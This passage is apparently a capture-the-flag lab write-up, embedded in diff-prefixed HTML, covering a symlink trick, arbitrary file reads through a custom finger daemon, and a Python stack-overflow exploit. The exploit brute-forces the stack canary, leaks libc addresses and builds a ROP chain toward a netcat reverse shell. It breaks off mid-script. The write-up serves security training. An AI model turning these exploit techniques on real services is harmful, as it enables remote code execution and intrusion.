+From bob@baffle.me  Thu Jan  2 11:38:22 2014
+X-Original-To: alice
+From: Bob &lt;bob@baffle.me&gt;
+To: alice@baffle.me
+Subject: Flag <span class="c">#2</span>
+Date: Thu,  2 Jan 2014 11:38:22 <span class="nt">-0800</span> <span class="o">(</span>PST<span class="o">)</span>
+
+Alice,
+
+I need you to login to my account. My password is <span class="k">in</span> /home/bob/flag.txt
+You<span class="s1">'ll need to authenticate to Flag Vault in order to get its contents.
+
+--
+Bob
+
+
+&amp;
+</span></code></pre></div></div>
+
+<p>This one was simple enough to get the flag, a symbolic link to our flag.txt file and our own auth.txt file and we got the password for bob.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice@baffle:/tmp<span class="nv">$ </span><span class="nb">cd</span> /home/alice
+<span class="nb">cd</span> /home/alice
+alice@baffle:/home/alice<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
+<span class="nb">ls</span> <span class="nt">-al</span>
+total 44
+drwxr-xr-x 3 alice alice 4096 Dec 19 07:49 <span class="nb">.</span>
+drwxr-xr-x 6 root  root  4096 Oct 20 03:38 ..
+<span class="nt">-rw-------</span> 1 alice alice    0 Oct 25 04:20 .bash_history
+<span class="nt">-rw-r--r--</span> 1 alice alice  220 Oct 17 15:23 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 alice alice 3515 Oct 17 15:23 .bashrc
+<span class="nt">-rw-r--r--</span> 1 root  root    29 Oct 20 03:37 .plan
+<span class="nt">-rw-r--r--</span> 1 alice alice  675 Oct 17 15:23 .profile
+drwx------ 2 root  root  4096 Oct 25 04:21 .ssh
+<span class="nt">-rwxr-xr-x</span> 1 alice alice 8376 Oct 17 15:24 ctftp
+<span class="nt">-rw-------</span> 1 alice alice  570 Dec 19 07:49 mbox
+alice@baffle:/home/alice<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> ../bob/filez/flag.txt flag.txt
+<span class="nb">ln</span> <span class="nt">-s</span> ../bob/filez/flag.txt flag.txt
+alice@baffle:/home/alice<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'password'</span> <span class="o">&gt;</span> auth.txt
+<span class="nb">echo</span> <span class="s1">'password'</span> <span class="o">&gt;</span> auth.txt
+alice@baffle:/home/alice<span class="nv">$ </span>../bob/filez/flag_vault
+../bob/filez/flag_vault
+______ _                _    _   _             _ _
+|  ___| |            /<span class="se">\|</span> |/<span class="se">\|</span> | | |           | | |
+| |_  | | __ _  __ _ <span class="se">\ </span><span class="sb">`</span> <span class="s1">' /| | | | __ _ _   _| | |_
+|  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
+| |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
+\_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
+                __/ |
+               |___/
+
+ENTER YOUR AUTHENTICATION CODE: password
+password
+CHECKING CODE... CODE IS VALID
+DATA: FLAG{tr3each3ry_anD_cUnn1ng}
+</span></code></pre></div></div>
+
+<p>Now comes the part I am dreading to write. Upon examination of /home/bob/binz we find a ctfingerd binary. I copied the file over to my machine for some testing, looks like it takes a user name as input and reads back the contents of the .plan file from their home directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64# ./ctfingerd &amp;
+<span class="o">[</span>1] 28646
+root@kali:/mnt/hgfs/kali64# + <span class="nb">bind </span><span class="k">done</span>
++ waiting <span class="k">for </span>connections...
+
+root@kali:/mnt/hgfs/kali64# nc 127.0.0.1 7979
++ connection accepted
++ back <span class="k">in </span>parent
+Socket fd: 4
+User to query: root
+User to query: plan_loc <span class="o">[</span>/root/.plan]
+Checking...
+Don<span class="s1">'t know anything about this user.
+---
+^C
+</span></code></pre></div></div>
+
+<p>Little bit of testing and I find I can read any file on the target system, but that doesn’t help me much other then get me another flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@baffle:/home/alice<span class="nv">$ </span>nc 127.0.0.1 7979
+Socket fd: 16
+User to query: /./././charlie/flag.txt
+Checking...
+FLAG<span class="o">{</span>i_haz_sriracha_ice_cream<span class="o">}</span>
+
+bob@baffle:/home/alice<span class="nv">$ </span>nc 127.0.0.1 7979
+Socket fd: 17
+User to query: /./././vulnhub/flag.txt
+Checking...
+Sorry Mario. The flag is <span class="k">in </span>another castle.
+</code></pre></div></div>
+
+<p>So I need to find a way to escalate privileges with this. Much to my demise, I see this in the disassembled code.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00400e0c    e82ffbffff     call sym.imp.__stack_chk_fail <span class="p">;</span>sym.imp.__stack_chk_fail<span class="o">()</span>
+</code></pre></div></div>
+
+<p>That’s right, there is a canary. I did some research and found that we can brute force the canary as it is a static canary, even though the application forks a new process on each connection it inherits the canary from the parent process. This is good, but now we just need to find a way to determine when we have triggered the check fail. Lucky for us, the application gives us a hint.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64# nc 127.0.0.1 7979
+Socket fd: 8
+User to query: root
+Checking...
+Don<span class="s1">'t know anything about this user.
+---
+^C
+root@kali:/mnt/hgfs/kali64# python -c'</span>print <span class="s2">"A"</span> <span class="k">*</span> 1001<span class="s1">' | nc 127.0.0.1 7979
+Socket fd: 9
+User to query: Checking...
+Don'</span>t know anything about this user.
+
+…SNIP…
+
+|   <span class="o">||</span>|     0x00400f20    e861fcffff     call sym.query_user <span class="p">;</span>sym.query_user<span class="o">()</span>
+|   <span class="o">||</span>|     0x00400f25    8b45c4         mov eax, dword <span class="o">[</span>rbp-local_7_4]
+|   <span class="o">||</span>|     0x00400f28    ba04000000     mov edx, 4
+|   <span class="o">||</span>|     0x00400f2d    be1b114000     mov esi, str.____n            <span class="p">;</span> <span class="s2">"---."</span> @ 0x40111b
+|   <span class="o">||</span>|     0x00400f32    89c7           mov edi, eax
+|   <span class="o">||</span>|     0x00400f34    e8e7f9ffff     call sym.imp.write <span class="p">;</span>sym.imp.write<span class="o">()</span>
+
+</code></pre></div></div>
+
+<p>As you can see, if query_user returns to main, then ‘—‘ is written to the socket. With this information, we can quickly find out exactly when we start to trigger the stack protection.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">canaryCounter</span> <span class="o">=</span> <span class="mi">990</span>
+<span class="k">print</span> <span class="s">"[+] Getting canary offset</span><span class="se">\n</span><span class="s">"</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">7979</span><span class="p">))</span>
+        <span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span> <span class="n">canaryCounter</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+        <span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="k">if</span> <span class="s">"---"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">rec</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Server response "</span> <span class="o">+</span> <span class="n">rec</span><span class="p">)</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Canary offset: "</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">canaryCounter</span><span class="p">))</span>
+		<span class="k">break</span>
+        <span class="n">canaryCounter</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="n">canaryCounter</span> <span class="o">=</span> <span class="n">canaryCounter</span> <span class="o">-</span> <span class="mi">1</span>
+
+</code></pre></div></div>
+
+<p>In the above, we are simply increasing our buffer size until we no longer see ’—‘ in the output, subtract one and we have our offset.</p>
+
+<p>Loaded with this information, we can now brute force the canary. We will overwrite it one byte at a time until we get the full canary.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">canaryCounter</span> <span class="o">=</span> <span class="n">canaryCounter</span> <span class="o">-</span> <span class="mi">1</span>
+<span class="k">print</span> <span class="s">"[+] Bruteforcing Canary"</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+                <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
+                <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">7979</span><span class="p">))</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">canaryCounter</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+                <span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="k">if</span> <span class="s">"---"</span> <span class="ow">in</span> <span class="n">rec</span><span class="p">:</span>
+                        <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
+                        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Found canary byte: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">))</span>
+                        <span class="k">print</span><span class="p">(</span><span class="s">"[*] Canary currently: "</span> <span class="o">+</span> <span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">))</span>
+                        <span class="k">break</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Canary found: "</span> <span class="o">+</span> <span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">))</span>
+
+</code></pre></div></div>
+
+<p>Now comes the fun part. Because of ASLR we can’t just overwrite the return address and jump right into our shellcode, and unlike before we don’t have a handy variable containing our shellcode. Instead, we’ll need to use ROP chains to accomplish what we need.</p>
+
+<p>So here is the plan:</p>
+
+<ol>
+  <li>Leak address of a library function in the GOT.</li>
+  <li>Obtain libc’s base address to calculate the address of other library functions. The base address will be the difference between our leaked address and the offset of that address in libc.so.6.</li>
+  <li>Add offset of system() from libc.so.6 back to the libc base address to get the address of system().</li>
+  <li>Write our reverse shell to a location in memory that is writable.</li>
+  <li>Call system() with our reverse shell and reap the rewards.</li>
+</ol>
+
+<p>For stage one, we’ll leak the address of memset(). Note that I had to pull down libc6.so.6 from the target to get all the offsets needed.</p>
+
+<ul>
+  <li>Get address of write@plt = 0x400920</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64# objdump <span class="nt">-d</span> ./ctfingerd | <span class="nb">grep</span> <span class="nt">-A5</span> write@
+0000000000400920 &lt;write@plt&gt;:
+  400920:	ff 25 8a 0b 20 00    	jmpq   <span class="k">*</span>0x200b8a<span class="o">(</span>%rip<span class="o">)</span>        <span class="c"># 6014b0 &lt;_GLOBAL_OFFSET_TABLE_+0x30&gt;</span>
+  400926:	68 03 00 00 00       	pushq  <span class="nv">$0x3</span>
+  40092b:	e9 b0 ff ff ff       	jmpq   4008e0 &lt;_init+0x20&gt;
+
+… SNIP …
+
+</code></pre></div></div>
+
+<ul>
+  <li>Get offset of memset() from libc.so.6 = 0x85620</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64# readelf <span class="nt">-s</span> libc.so.6 | <span class="nb">grep </span>memset
+    66: 000000000009d850    90 FUNC    GLOBAL DEFAULT   12 wmemset@@GLIBC_2.2.5
+   771: 00000000000f7780    16 FUNC    GLOBAL DEFAULT   12 __wmemset_chk@@GLIBC_2.4
+   838: 0000000000085620   247 FUNC    GLOBAL DEFAULT   12 memset@@GLIBC_2.2.5
+  1383: 0000000000085610     9 FUNC    GLOBAL DEFAULT   12 __memset_chk@@GLIBC_2.3.4
+</code></pre></div></div>
+
+<ul>
+  <li>Get offset of system() from libc.so.6 = 0x41490</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64# readelf <span class="nt">-s</span> libc.so.6 | <span class="nb">grep </span>system
+   223: 0000000000113ec0    70 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.2.5
+   577: 0000000000041490    45 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+  1337: 0000000000041490    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
+</code></pre></div></div>
+
+<ul>
+  <li>Get address of memset() in GOT = 0x6014e0</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64# objdump -R ctfingerd | grep memset
+00000000006014e0 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
+</code></pre></div></div>
+
+<p>The other thing we need to do is make sure we are writing back to the correct socket. The developer conveniently gave us the socket FD so we can capture that.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">7979</span><span class="p">))</span>
+<span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">":"</span>
+<span class="n">pre</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">sockFD</span> <span class="o">=</span> <span class="n">rec</span><span class="o">.</span><span class="n">partition</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">sockFD</span> <span class="o">=</span> <span class="n">sockFD</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">sockFD</span> <span class="o">=</span> <span class="n">sockFD</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+
+<span class="n">sockFD</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sockFD</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now what we need to do is find some a ROP gadget that will help us leak the address of memset(). What we are looking for is a pop3ret to pop rdi, rsi, and rdx and finally return. Problem is we don’t have a pop3ret but we do have the below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>ropsearch <span class="s1">'pop rsi'</span>
+Searching <span class="k">for </span>ROP gadget: <span class="s1">'pop rsi'</span> <span class="k">in</span>: binary ranges
+0x00401011 : <span class="o">(</span>b<span class="s1">'5e415fc3'</span><span class="o">)</span>	pop rsi<span class="p">;</span> pop r15<span class="p">;</span> ret
+gdb-peda<span class="nv">$ </span>ropsearch <span class="s1">'pop rdi'</span>
+Searching <span class="k">for </span>ROP gadget: <span class="s1">'pop rdi'</span> <span class="k">in</span>: binary ranges
+0x00401013 : <span class="o">(</span>b<span class="s1">'5fc3'</span><span class="o">)</span>	pop rdi<span class="p">;</span> ret
+gdb-peda<span class="nv">$ </span>ropsearch <span class="s1">'pop rdx'</span>
+Searching <span class="k">for </span>ROP gadget: <span class="s1">'pop rdx'</span> <span class="k">in</span>: binary ranges
+Not found
+</code></pre></div></div>
+
+<p>So our exploit will look like this now.</p>
+
+<ul>
+  <li>0x00 - 0 out the return address</li>
+  <li>0x00401013 - Address of our pop rdi ; ret. Popping the socketFD into rdi.</li>
+  <li>Socket FD - The socket to write the results back to.</li>
+  <li>0x00401011 - Address of our pop rsi; pop r15; ret. - Will address of memset() into rsi and some junk in r15.</li>
+  <li>0x6014e0 - Address of memset() in the GOT.</li>
+  <li>0x00 - Junk for r15</li>
+  <li>0x400920 - Address of write@plt</li>
+</ul>
+
+<p>So at this point we will pop the socketFD into rdi , the address of memset() in the GOT into rsi and some junk into r15. At that point we will call write() which will write back the address of memset() in libc to us.</p>
+
+<p>We can use that to calculate the libc base and the final address of system() with some simple math. So I present to you the stage 1 code.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memset_got</span> <span class="o">=</span> <span class="mh">0x6014e0</span>
+<span class="n">memset_libc_offset</span> <span class="o">=</span> <span class="mh">0x85620</span>
+<span class="n">system_libc_offset</span> <span class="o">=</span> <span class="mh">0x41490</span>
+
+<span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0x400920</span>
+<span class="n">read_plt</span> <span class="o">=</span> <span class="mh">0x4009b0</span>
+
+<span class="n">poprdi</span> <span class="o">=</span> <span class="mh">0x00401013</span>
+<span class="n">poprsi</span> <span class="o">=</span> <span class="mh">0x00401011</span>
+
+
+<span class="c"># Stage 1: leak memset() libc address using write@pld</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">canaryCounter</span>		<span class="c"># trigger overflow</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>					<span class="c"># insert correct canary</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>		<span class="c"># overwrite RBP</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprdi</span><span class="p">)</span>		<span class="c"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">sockFD</span><span class="p">)</span>		<span class="c"># stdout to socket</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprsi</span><span class="p">)</span>		<span class="c"># pop rsi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">memset_got</span><span class="p">)</span>	<span class="c"># address to read from</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>		<span class="c"># junk for r15</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">write_plt</span><span class="p">)</span>	<span class="c"># return to write@plt</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">rec</span>
+<span class="n">s</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">split</span> <span class="o">=</span> <span class="n">rec</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">memset_addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">split</span><span class="p">[</span><span class="mi">2</span><span class="p">][:</span><span class="mi">8</span><span class="p">])</span>
+<span class="k">print</span><span class="s">"[+] memset() is at: "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">memset_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">memset_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">memset_libc_offset</span><span class="p">)</span>
+<span class="k">print</span><span class="s">"[+] libc base is at: "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_libc_offset</span><span class="p">)</span>
+<span class="k">print</span><span class="s">"[+] sysem() is at: "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now for stage two we need to save our reverse shell string to a writable location. I’m using a simple nc reverse shell for this one, we’ll use read@plt to read from the socket and save it to a location in memory.</p>
+
+<p>Our new ROP chain will look something like this for Stage 2</p>
+
+<ul>
+  <li>Canary</li>
+  <li>0x00 - 0 out the return address</li>
+  <li>0x00401013 - Address of our pop rdi; ret. Popping the socketFD into RDI</li>
+  <li>Socket FD - The socket to read our reverse shell from</li>
+  <li>0x00401011 - Address of our pop rsi; pop r15; ret. - Will set the location in memorty to write to.</li>
+  <li>0x601010 - Memory location to store our reverse shell command.</li>
+  <li>sockFD - Junk for r15</li>
+  <li>0x4009b0 - Address of read@plt</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Stage 2: Save string to writable location</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprdi</span><span class="p">)</span>		<span class="c"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">sockFD</span><span class="p">)</span>		<span class="c"># socket to read from</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprsi</span><span class="p">)</span>		<span class="c"># pop rsi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x601010</span><span class="p">)</span>		<span class="c"># location to write to</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">sockFD</span><span class="p">)</span>		<span class="c"># junk for r15</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">read_plt</span><span class="p">)</span>		<span class="c"># return to read()</span>
+</code></pre></div></div>
+
+<p>Now for Stage 3, we just need to pop the location of our reverse shell command into RDI and call system()</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Stage 3: call system() with location of string</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">poprdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x601010</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>So when we put it all together, here is our final exploit code.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">canaryCounter</span> <span class="o">=</span> <span class="mi">990</span>
+<span class="k">print</span> <span class="s">"[+] Getting canary offset</span><span class="se">\n</span><span class="s">"</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">7979</span><span class="p">))</span>
+        <span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span> <span class="n">canaryCounter</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+        <span class="n">rec</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="k">if</span> <span class="s">"---"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">rec</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Server response "</span> <span class="o">+</span> <span class="n">rec</span><span class="p">)</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Canary offset: "</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">canaryCounter</span><span class="p">))</span>
+		<span class="k">break</span>
+        <span class="n">canaryCounter</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="n">canaryCounter</span> <span class="o">=</span> <span class="n">canaryCounter</span> <span class="o">-</span> <span class="mi">1</span>
+<span class="k">print</span> <span class="s">"[+] Bruteforcing Canary"</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+                <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
+                <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">7979</span><span class="p">))</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">canaryCounter</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+                <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
